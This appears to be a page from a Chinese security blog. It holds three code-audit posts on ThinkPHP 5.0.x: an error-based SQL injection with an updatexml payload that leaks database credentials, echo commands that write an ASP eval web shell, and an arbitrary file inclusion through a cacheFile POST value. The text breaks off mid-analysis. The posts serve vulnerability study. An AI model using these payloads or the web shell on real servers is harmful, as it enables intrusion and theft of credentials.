<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/4/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/" itemprop="url">代码审计 | ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-19T08:15:41+08:00">
                2018-09-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p><strong>1.基础知识</strong><br>A.Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/42wg1fal3zdlypt0yqnx10qj/image_1cnoln6a46g715koj3o6rcpbhm.png" alt="image_1cnoln6a46g715koj3o6rcpbhm.png-71.9kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a><br><strong>2.环境搭建</strong><br>A.</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use app\model\Gather;
use think\Db;

class Index
{    
    public function test()
    {
        $ids = input(&quot;id/a&quot;);
        $gather = new Gather();
        $gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
    }
}
?&gt;
</code></pre><p>B.</p>
<pre><code>#application\model\Gather.php
&lt;?php
namespace app\model;
use think\Model;
use think\Db;

class Gather extends Model {
    public function getModel(){
        $rs = Db::query(&apos;show columns FROM user&apos;);
        $a = [];
        if($rs){
            foreach ($rs as $key =&gt; $v) {
                $a[$v[&apos;Field&apos;]] = $v[&apos;Default&apos;];
                if($v[&apos;key&apos;] == &apos;PRI&apos;){
                    $v[&apos;Field&apos;] = 0;
                }    
            }
    }    return $a;        
    }
}    

?&gt;
</code></pre><p>C.<br> 数据库下新建表gather表下新建字段gather_waf、id</p>
<p><strong>3.漏洞利用</strong><br>payload：<br><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
<p><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
<p><strong>4.代码审计</strong><br>相关变量已经在注释中<br>A.从index.php开始，</p>
<pre><code>$gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
</code></pre><p>B.跟进model.php的update()方法:<br>1448行:</p>
<pre><code>#thinkphp\library\think\Model.php
$result = $model-&gt;isUpdate(true)-&gt;save($data, $where);
</code></pre><p>跟进save()方法<br>1002行:</p>
<pre><code>#thinkphp\library\think\Model.php
public function save($data = [], $where = [], $sequence = null)
{
    if (!empty($data)) {
        // 数据自动验证
        if (!$this-&gt;validateData($data)) {
            return false;
        }
        // 数据对象赋值
        foreach ($data as $key =&gt; $value) {
            $this-&gt;setAttr($key, $value, $data);
        }
    }
    ...
    $pk = $this-&gt;getPk();//$pk:NULL
    if ($this-&gt;isUpdate) {//$this-&gt;isUpdate:true
    ...
        // 模型更新
        //$this-&gt;getQuery()://think\db\Query::$where
        $result =                
        $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);

        ...
}
</code></pre><p>其中:            </p>
<pre><code>$result = $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);
</code></pre><p>C.跟进query.php的update()方法</p>
<pre><code>#thinkphp\library\think\db\Query.php
public function update(array $data = [])
{   
    ...
    //where不为空
    ...
    // 生成UPDATE SQL语句
    $sql = $this-&gt;builder-&gt;update($data, $options);
    // 获取参数绑定
    $bind = $this-&gt;getBind();
    ... 
    else {
        // 检测缓存
        if (isset($key) &amp;&amp; Cache::get($key)) {
            // 删除缓存
            Cache::rm($key);
        } elseif (!empty($options[&apos;cache&apos;][&apos;tag&apos;])) {
            Cache::clear($options[&apos;cache&apos;][&apos;tag&apos;]);
        }
        // 执行操作
        //$sql:UPDATE `gather` SET `gather_waf`=:__data__gather_waf WHERE `id` IN (:where_id_in_00000&apos;)
        $result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);

        ...
        return $result;
    }
}
</code></pre><p>其中:</p>
<pre><code>$sql = $this-&gt;builder-&gt;update($data, $options);
</code></pre><p>D.跟进<code>thinkphp\library\think\db\Builder.php</code>的<code>update()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/u6zwd3bbanwd7vefq952id1a/image_1cno7um1g11q71p2213001b9psbf1p.png" alt="image_1cno7um1g11q71p2213001b9psbf1p.png-71.8kB"><br>其中:</p>
<pre><code>$this-&gt;parseWhere($options[&apos;where&apos;], $options),
</code></pre><p>跟进<code>parseWhere()</code>方法:</p>
<pre><code>#thinkphp\library\think\db\Builder.php
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);
    //$whereStr:`id` IN (:where_id_in_00000&apos;)
    ...
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;

}
</code></pre><p>其中:</p>
<pre><code>$whereStr = $this-&gt;buildWhere($where, $options);
</code></pre><p>跟进<code>buildWhere()</code>方法:</p>
<pre><code>public function buildWhere($where, $options)
{   
    ...

    $whereStr = &apos;&apos;;
    //$options[&apos;table&apos;]:gather
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
    foreach ($where as $key =&gt; $val) {
        $str = [];
        foreach ($val as $field =&gt; $value) {
            ....
            else {
                // 对字段使用表达式查询
                $field = is_string($field) ? $field : &apos;&apos;;
                $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
            }
        }
        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
}
</code></pre><p>其中:</p>
<pre><code>$str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
</code></pre><p>跟进<code>parseWhereItem()</code>方法:</p>
<pre><code>protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
{   
    //$field:id   $val:[0=&gt;&apos;in&apos;,1=&gt;{[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;}]
    $key = $field ? $this-&gt;parseKey($field, $options) : &apos;&apos;;
    //$key:`id`

    ...

    list($exp, $value) = $val;
    //$exp:in   $value: [&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;

    ...

    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];//$exp:IN
        } else {
            throw new Exception(&apos;where express error:&apos; . $exp);
        }
    }
    ...
    $whereStr = &apos;&apos;;
    ...
</code></pre><p>这里得到的<code>$exp</code>的值为<code>IN</code>,我们看下与in有关的操作代码:</p>
<pre><code>if (preg_match(&apos;/\W/&apos;, $bindName)) {
// 处理带非单词字符的字段名
$bindName = md5($bindName);
}
...
elseif (in_array($exp, [&apos;NOT IN&apos;, &apos;IN&apos;])) {//进入
   // IN 查询
   if ($value instanceof \Closure) {
       $whereStr .= $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseClosure($value);
   } else {//进入
       $value = is_array($value) ? $value : explode(&apos;,&apos;, $value);
       if (array_key_exists($field, $binds)) {
           $bind  = [];
           $array = [];
           //$value:[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;
           foreach ($value as $k =&gt; $v) {
               if ($this-&gt;query-&gt;isBind($bindName . &apos;_in_&apos; . $k)) {//判断这个bindname不存在
                   $bindKey = $bindName . &apos;_in_&apos; . uniqid() . &apos;_&apos; . $k;
               } else {//进入
                   $bindKey = $bindName . &apos;_in_&apos; . $k;
               }
               $bind[$bindKey] = [$v, $bindType];
               $array[]        = &apos;:&apos; . $bindKey;
           }
           //$bind:[&quot;where_id_in_00000&apos;&quot;]=&gt;{ [0]=&gt; &quot;1&apos;&quot; [1]=&gt; int(2) } 
           $this-&gt;query-&gt;bind($bind);
           $zone = implode(&apos;,&apos;, $array);
       } else {
           $zone = implode(&apos;,&apos;, $this-&gt;parseValue($value, $field));
       }
       $whereStr .= $key . &apos; &apos; . $exp . &apos; (&apos; . (empty($zone) ? &quot;&apos;&apos;&quot; : $zone) . &apos;)&apos;;
       //$whereStr：`id` IN (:where_id_in_00000&apos;)
   }
        }
</code></pre><p>E.这里就是形成漏洞的<strong>关键</strong>处:虽然<code>$bindName</code>在进入绑定操作前进行了<code>preg_match()</code>检测,但是在<code>$value</code>为数组的情况下程序就会遍历数组<code>$value</code>并将键组<code>$k</code>直接拼接到<code>$bindName</code>,而<code>$k</code>并没有进行安全处理,所以导致了在预编译的时候SQL异常,tp框架在5.0.9又默认开启debug调试模式 所以爆出数据库连接账户和密码</p>
<p>这里我们理一下文件及跟进的函数</p>
<pre><code>Model.php(update)--&gt;Model.php(save)---&gt;query.php(update)--&gt;Builder.php(update)--&gt;Builder.php(parseWhere)--&gt;Builder.php(buildWhere)--&gt;Builder.php(parseWhereItem)  得到$sql语句
</code></pre><p>然后sql语句回溯<br><code>Builder.php(buildWhere)--&gt;Builder.php(parseWhere)--&gt;Builder.php(update)--query.php(update)</code></p>
<p>在quert.php的update()方法,执行execute时报错</p>
<pre><code>$result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);
</code></pre><p>我们跟进execute()方法看一下:</p>
<pre><code>#thinkphp\library\think\db\Connection.php
...
if (empty($this-&gt;PDOStatement)) {
$this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
</code></pre><p>经过上下文的<code>die()</code>测试,发现程序是在用<code>prepare()</code>编译时报错</p>
<p>F.按照文章中笔者的说法,这里并不存在sql注入,但是经过查阅相关资料及P师傅的博客,发现这里其实是一个不允许子查询的sql注入</p>
<p><strong>鸡肋sql注入:</strong><br>在上面的分析中 我们知道<code>$k</code>也就是<code>$bindName</code>是我们可以控制的,说明我们可控制预编译的sql语句,但是这里为什么说是一个不允许子查询的sql注入呢。<br>这里涉及到PDO预编译的三个步骤:</p>
<pre><code>1.prepare($sql)    编译SQL语句
2.bindParam($a,$b)  绑定 PHP 变量到参数标记
3.execute()    执行sql语句
</code></pre><p>这里也涉及到一个<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>预处理参数的配置<br>直接引用P师傅的话:</p>
<blockquote>
<p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES<br>=&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p>
<p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p>
</blockquote>
<p>默认的Thinkphp配置：<br><img src="http://static.zybuluo.com/chhyx/g0wkga74rhoc97bjywwbbe38/image_1cnol50m31iepu3usdb8epq99.png" alt="image_1cnol50m31iepu3usdb8epq99.png-21.5kB"></p>
<p>那么,假设在第一步执行prepare($SQL)的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步，这就是执行我们sql语句的关键<br>访问:</p>
<pre><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1
</code></pre><p>即可成功获得user()信息:<br><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
<p>但是id数组的键并不能为子查询语句 只能用一些数据库函数来注入,由于笔者并不擅长sql注入,等有时间回来再试试。<br><strong>5.参考链接</strong><br>1.<a href="http://www.runoob.com/php/pdo-prepare.html" target="_blank" rel="noopener">http://www.runoob.com/php/pdo-prepare.html</a><br>2.<a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a><br>3.<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a><br>4.<a href="https://www.kancloud.cn/manual/thinkphp5/135187" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/135187</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/18/echo写马技巧/" itemprop="url">echo写马技巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
                2018-09-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>win下与Linux写马方式不同 记录一下</p>
</blockquote>
<hr>
<p><strong>1.windows环境：</strong></p>
<p>错误姿势:</p>
<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
<p>我们可以看到我们的代码加了引号 导致无法执行</p>
<p>正确姿势:</p>
<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/" itemprop="url">代码审计 | ThinkPHP3.x/5.x框架任意文件包含</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-17T10:15:41+08:00">
                2018-09-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近学习thinkphp框架审计 网上找了几个例子去复现,看到关于这个漏洞的文章不是很多,所以在大佬的payload的基础上自己试着审计了一波,记录一下。</p>
</blockquote>
<hr>
<p>审计cms：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞原理:</p>
<pre><code>ThinkPHP在加载模版解析变量时存在变量覆盖的问题，且没有对 $cacheFile 进行相应的消毒处理，导致模板文件的路径可以被覆盖，从而导致任意文件包含漏洞的发生。
</code></pre><p>##<strong>1.基础知识:</strong><br>Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/g7pjo7e4gk3hshv17d0equzb/image.png" alt="image.png-73.6kB"></p>
<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.</p>
<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
class Index extends \think\Controller 
{
    public function index()
    {
        $this-&gt;assign($this-&gt;request-&gt;post());
        return $this-&gt;fetch();

        }
}
</code></pre><p>B.在thinkphp5_0_10\application\index\view\index目录下新建一个index.html，内容随意填写</p>
<p>C.因为测试漏洞为文件包含 所以在根目录新建一个1.txt当测试用(其他格式也可以 内容<code>&lt;?php phpinfo();?&gt;)</code></p>
<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
<pre><code>post:cacheFile=../1.txt
</code></pre><p><img src="http://static.zybuluo.com/chhyx/068ucjph0k3tr314ximxszv2/image.png" alt="image.png-34kB"></p>
<p>##<strong>4.代码分析:</strong><br><strong>其相关变量的值已加在注释中:</strong><br>A.从index.php开始分析:</p>
<pre><code>$this-&gt;assign($this-&gt;request-&gt;post());
</code></pre><p>进入thinkphp5_0_10\thinkphp\library\think\Controller.php</p>
<p><img src="http://static.zybuluo.com/chhyx/d3vvbqzjlw3m0h33qojuykrj/image.png" alt="image.png-13.3kB"></p>
<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php 92行
public function assign($name, $value = &apos;&apos;)
{      
    if (is_array($name)) {//$name:[&quot;cacheFile&quot;]=&gt;&quot;../1.txt&quot;
        //$this-&gt;data:空字符  把$name赋值给$this-&gt;data
        $this-&gt;data = array_merge($this-&gt;data, $name);
    } else {
        $this-&gt;data[$name] = $value;
    }
    return $this;
}
</code></pre><p>传进去的变量<code>cacheFile</code>成功存储,我们打印下<code>$this</code>:<br><img src="http://static.zybuluo.com/chhyx/8f08wcjbsngdwizmbb7xudjj/image.png" alt="image.png-112.8kB"></p>
<p>B.返回index.php继续分析:</p>
<pre><code>return $this-&gt;fetch();
</code></pre><p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code><br><img src="http://static.zybuluo.com/chhyx/17x7tdldon5dbxedadlkq2vl/image.png" alt="image.png-13.8kB"></p>
<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   149行
public function fetch($template = &apos;&apos;, $vars = [], $replace = [], $config = [], $renderContent = false)
    {
        // 模板变量
        //self::$var:空  $vars:空
        $vars = array_merge(self::$var, $this-&gt;data, $vars);

        // 页面缓存
        ob_start();
        ob_implicit_flush(0);

        // 渲染输出
        $method = $renderContent ? &apos;display&apos; : &apos;fetch&apos;;//$renderContent=false所以$method=fetch
        $this-&gt;engine-&gt;$method($template, $vars, $config);//$this-&gt;engine-&gt;$fetch

        // 获取并清空缓存

        $content = ob_get_clean();
        // 内容过滤标签
        Hook::listen(&apos;view_filter&apos;, $content);
        // 允许用户自定义模板的字符串替换
        $replace = array_merge($this-&gt;replace, $replace);
        if (!empty($replace)) {
            $content = strtr($content, $replace);
        }

        return $content;
    }
</code></pre><p>在上面的<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code> 这里的$method是fetch<br>跟进本文件的<code>engine()</code>方法:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   109行
public function engine($options = [])
 {   
     if (is_string($options)) {
         $type    = $options;
         $options = [];
     } else {
         $type = !empty($options[&apos;type&apos;]) ? $options[&apos;type&apos;] : &apos;Think&apos;;//$type:Think
     }
     $class = false !== strpos($type, &apos;\\&apos;) ? $type : &apos;\\think\\view\\driver\\&apos; . ucfirst($type);
     //$class:\think\view\driver\Think
     if (isset($options[&apos;type&apos;])) {
         unset($options[&apos;type&apos;]);
     }
     $this-&gt;engine = new $class($options);
     return $this;
 }
</code></pre><p>在上面的<code>$this-&gt;engine = new $class($options);</code>初始化了一个类 我们打印下这个类:<br><img src="http://static.zybuluo.com/chhyx/3m78ae1hfa152s73s73of0xc/image.png" alt="image.png-72.3kB"></p>
<p>C.跟进<code>thinkphp\library\think\view\driver\Think.php</code> </p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\view\driver\Think.php  72行:
public function fetch($template, $data = [], $config = [])
{   
    if (&apos;&apos; == pathinfo($template, PATHINFO_EXTENSION)) {
        // 获取模板文件名
        $template = $this-&gt;parseTemplate($template);
        //$template:application/index\view\index\index.html
    }
    // 模板不存在 抛出异常
    if (!is_file($template)) {
        throw new TemplateNotFoundException(&apos;template not exists:&apos; . $template, $template);
    }
    // 记录视图信息
    App::$debug &amp;&amp; Log::record(&apos;[ VIEW ] &apos; . $template . &apos; [ &apos; . var_export(array_keys($data), true) . &apos; ]&apos;, &apos;info&apos;);
    $this-&gt;template-&gt;fetch($template, $data, $config);
}
</code></pre><p>在上面的<code>$this-&gt;template-&gt;fetch($template, $data, $config);</code>,我们跟进<code>thinkphp\library\think\Template.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\Template.php  168行
public function fetch($template, $vars = [], $config = [])
    {   
        //$template:application/index\view\index\index.html
        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; } 
        if ($vars) {
            $this-&gt;data = $vars;
        }
        if ($config) {
            $this-&gt;config($config);
        }
        ...
        $template = $this-&gt;parseTemplateFile($template);
        //$template:application/index\view\index\index.html
        if ($template) {
            $cacheFile = $this-&gt;config[&apos;cache_path&apos;] . $this-&gt;config[&apos;cache_prefix&apos;] . md5($template) . &apos;.&apos; . ltrim($this-&gt;config[&apos;cache_suffix&apos;], &apos;.&apos;);
            //得到一个缓存文件
            //&amp;cacheFile:runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
            ...
            // 页面缓存
            ob_start();
            ob_implicit_flush(0);
            // 读取编译存储
            //$this-&gt;storage:object(think\template\driver\File)
            $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);
            // 获取并清空缓存
            $content = ob_get_clean();
            if (!empty($this-&gt;config[&apos;cache_id&apos;]) &amp;&amp; $this-&gt;config[&apos;display_cache&apos;]) {
                // 缓存页面输出
                Cache::set($this-&gt;config[&apos;cache_id&apos;], $content, $this-&gt;config[&apos;cache_time&apos;]);
            }
            echo $content;
        }
    }
</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br><img src="http://static.zybuluo.com/chhyx/j7ho82m627t9qpqfrmcxcbao/image.png" alt="image.png-75.5kB"><br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\template\driver\File.php 43行
public function read($cacheFile, $vars = [])
    {   
        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; }
        //$cacheFile:thinkphp5_0_10\runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
        if (!empty($vars) &amp;&amp; is_array($vars)) {
            // 模板阵列变量分解成为独立变量
            extract($vars, EXTR_OVERWRITE);//如果有冲突,覆盖已有变量
        }
        //载入模版缓存文件
        include $cacheFile;//包含php文件
